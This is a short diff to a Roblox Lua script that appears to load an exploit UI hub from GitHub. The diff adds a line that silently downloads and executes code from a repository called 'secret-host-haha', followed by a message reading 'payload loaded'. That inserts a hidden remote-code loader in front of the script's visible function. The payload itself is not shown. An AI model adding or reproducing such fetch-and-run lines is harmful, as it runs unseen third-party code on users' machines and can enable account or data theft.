@@ -1,3 +1,7 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/delta-hydro/secret-host-haha/main/init_script.lua"))();
+wait(3)
+print("payload loaded")
+
 local success, result = pcall(function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/anyahubs/CommanderX/main/UI'))()
 end)
